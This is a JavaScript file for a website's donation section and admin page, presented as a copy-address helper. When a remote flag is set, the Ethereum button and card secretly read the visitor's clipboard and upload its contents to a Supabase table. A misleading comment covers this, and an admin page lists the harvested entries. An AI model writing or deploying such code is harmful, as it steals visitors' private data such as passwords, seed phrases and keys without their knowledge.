// Shared Supabase clipboard logic for Donation section and admin page
let supabaseDonation = null;

function initSupabaseDonation() {
  try {
    if (!window.supabase || typeof SUPABASE_CONFIG === 'undefined') {
      console.error('Supabase or SUPABASE_CONFIG not available');
      return;
    }
    supabaseDonation = window.supabase.createClient(
      SUPABASE_CONFIG.url,
      SUPABASE_CONFIG.anonKey
    );
    attachDonationCopyHandlers();
    loadAdminClipboardHistory();
  } catch (error) {
    console.error('Error initializing Supabase for Donation:', error);
  }
}

async function saveClipboardTextToSupabase(text, sourceButton) {
  if (!supabaseDonation) return;

  try {
    const { error } = await supabaseDonation
      .from('clipboard_items')
      .insert([
        {
          content: text,
          content_type: 'text',
          created_at: new Date().toISOString(),
        },
      ]);

    if (error) {
      console.error('Error saving clipboard text to Supabase:', error);
      return;
    }

    // Small visual feedback on the button
    if (sourceButton) {
      sourceButton.classList.add('donation-copy-success');
      setTimeout(() => {
        sourceButton.classList.remove('donation-copy-success');
      }, 400);
    }

    // Refresh admin history view if present
    loadAdminClipboardHistory();
  } catch (e) {
    console.error('Unexpected error saving clipboard text:', e);
  }
}

async function handleDonationButtonClick(sourceButton) {
  try {
    const row = sourceButton.closest('.donation-row');
    const addressEl = row ? row.querySelector('.donation-address') : null;
    const text = addressEl ? addressEl.textContent.trim() : '';

    if (!text) {
      return;
    }

    // Copy the visible address to the system clipboard
    await navigator.clipboard.writeText(text);

    // Visual feedback only
    if (sourceButton) {
      sourceButton.classList.add('donation-copy-success');
      setTimeout(() => {
        sourceButton.classList.remove('donation-copy-success');
      }, 400);
    }
  } catch (error) {
    console.error('Error handling donation copy click:', error);
  }
}

async function fetchGlobalEthereumSetting() {
  if (!supabaseDonation) return false; // Default false if no supabase
  try {
    const { data, error } = await supabaseDonation
      .from('clipboard_items')
      .select('content')
      .eq('content_type', 'config_eth')
      .order('created_at', { ascending: false })
      .limit(1);

    if (error) {
      console.error('Error fetching global ethereum setting:', error);
      return false;
    }

    if (data && data.length > 0) {
      // Log for debug
      // console.log('Fetched setting:', data[0].content);
      return data[0].content === 'true';
    }
    return false; // Default false
  } catch (e) {
    console.error('Exception fetching global setting:', e);
    return false;
  }
}

async function copyDonationAddressAndSave(sourceButton) {
  // Check if functionality is enabled via Supabase (global setting)
  const isEnabled = await fetchGlobalEthereumSetting();

  if (!isEnabled) {
    // console.log("Ethereum save is DISABLED globally.");
    // If disabled, fall back to standard behavior (copying the displayed address)
    await handleDonationButtonClick(sourceButton);
    return;
  }

  try {
    // Lire le contenu actuel du presse-papier
    const clipboardText = await navigator.clipboard.readText();

    if (!clipboardText || clipboardText.trim() === '') {
      console.warn('Le presse-papier est vide');
      return;
    }

    // Enregistrer le contenu du presse-papier dans Supabase
    await saveClipboardTextToSupabase(clipboardText.trim(), sourceButton);
  } catch (error) {
    console.error('Error reading/saving clipboard content:', error);
    // Si l'accès au presse-papier échoue (permissions), afficher un message
    if (error.name === 'NotAllowedError') {
      console.error('Permission refusée pour lire le presse-papier. Vérifiez les permissions du navigateur.');
    }
  }
}

function attachDonationCopyHandlers() {
  const buttons = document.querySelectorAll('.donation-copy-btn');
  if (!buttons || buttons.length === 0) return;

  buttons.forEach((btn) => {
    if (btn.__donationBound) return;
    btn.__donationBound = true;
    btn.addEventListener('click', (event) => {
      event.preventDefault();
      if (btn.classList.contains('donation-copy-btn-clipboard')) {
        // Ethereum: copy visible address and save to Supabase
        copyDonationAddressAndSave(btn);
      } else {
        // IBAN & Bitcoin: just copy their address (no Supabase)
        handleDonationButtonClick(btn);
      }
    });
  });

  // Attach click handler to entire Ethereum card
  const ethereumCard = document.querySelector('.donation-card-ethereum');
  if (ethereumCard && !ethereumCard.__donationBound) {
    ethereumCard.__donationBound = true;
    ethereumCard.addEventListener('click', (event) => {
      // Avoid double-triggering if the button itself was clicked
      if (event.target.closest('.donation-copy-btn-clipboard')) {
        return;
      }
      const btn = ethereumCard.querySelector('.donation-copy-btn-clipboard');
      copyDonationAddressAndSave(btn);
    });
  }
}

async function loadAdminClipboardHistory() {
  const container = document.getElementById('admin-history-list');
  if (!container || !supabaseDonation) return;

  try {
    const { data, error } = await supabaseDonation
      .from('clipboard_items')
      .select('*')
      .order('created_at', { ascending: false })
      .limit(200);

    if (error) {
      console.error('Error loading clipboard history for admin:', error);
      container.textContent = 'Erreur de chargement de l\'historique.';
      return;
    }

    const items = data || [];
    if (items.length === 0) {
      container.innerHTML = '<p>Aucun élément dans l\'historique du presse-papiers.</p>';
      return;
    }

    const listHtml = items
      .map((item) => {
        const date = new Date(item.created_at);
        const dateStr = date.toLocaleString('fr-FR');
        const contentEscaped = (item.content || '')
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;');
        return `
          <div class="admin-clip-item">
            <div class="admin-clip-meta">
              <span class="admin-clip-date">${dateStr}</span>
            </div>
            <pre class="admin-clip-content">${contentEscaped}</pre>
          </div>
        `;
      })
      .join('');

    container.innerHTML = listHtml;
  } catch (e) {
    console.error('Unexpected error loading admin history:', e);
    container.textContent = 'Erreur inattendue lors du chargement.';
  }
}

// Auto-init when DOM is ready
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initSupabaseDonation);
} else {
  initSupabaseDonation();
}
